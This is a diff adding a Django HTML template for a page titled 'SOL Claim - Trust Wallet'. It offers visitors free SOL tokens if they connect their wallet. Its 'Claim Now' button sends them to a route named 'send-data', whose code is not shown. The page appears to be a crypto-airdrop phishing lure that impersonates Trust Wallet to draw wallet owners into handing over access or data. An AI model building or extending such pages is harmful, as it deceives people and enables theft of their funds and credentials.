@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOL Claim - Trust Wallet</title>
+    <link rel="stylesheet" href="{% static "style.css" %}">
+</head>
+<body>
+    <div class="container">
+        <div class="claim-card">
+            <div class="token-info">
+                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL" class="token-logo">
+                <h1>Claim Your SOL</h1>
+            </div>
+            <p class="claim-description">Connect your wallet to receive your SOL tokens</p>
+            <button id="claimButton" class="claim-button">Claim Now</button>
+        </div>
+    </div>
+    <script>
+        document.getElementById("claimButton").addEventListener("click", function () {
+            window.location.href = "{% url 'send-data' %}";
+        });
+    </script>
+</body>
+</html>
